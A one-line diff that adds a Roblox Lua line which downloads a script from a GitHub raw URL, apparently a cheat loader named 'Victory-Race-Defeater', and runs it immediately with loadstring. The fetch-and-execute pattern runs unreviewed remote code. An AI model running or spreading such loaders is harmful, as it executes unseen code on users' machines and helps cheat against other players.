@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ProtoRBLX/Victory-Race-Defeater/main/README.md'),true))()
